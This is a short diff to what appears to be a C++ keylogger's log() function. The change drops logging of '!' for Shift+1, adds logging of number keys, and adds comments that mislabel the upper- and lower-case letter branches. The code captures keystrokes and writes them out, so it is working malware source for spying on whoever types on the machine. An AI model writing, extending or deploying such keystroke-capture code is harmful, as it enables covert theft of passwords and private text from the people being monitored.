@@ -25,11 +25,6 @@ void log() {
 				case 27:
 					write << "<ESC>";
 					break;
-				case 49:
-					if (GetAsyncKeyState(0x10)) {
-						write << "!";
-					}
-					break;
 				case VK_SPACE:
 					write << " ";
 					break;
@@ -43,11 +38,13 @@ void log() {
 					write << "<BACKSPACE>";
 					break;
 				default:
-					if (((key > 64) && (key < 91))
+					if (((key > 64) && (key < 91)) // upper case letters
 							&& !(GetAsyncKeyState(0x10))) {
 						key += 32;
 						write << key;
-					} else if ((key > 64) && (key < 91)) {
+					} else if ((key > 64) && (key < 91)) { //lower case letters
+						write << key;
+					} else if((key > 47) && (key < 58)) { //numbers
 						write << key;
 					}
 					break;
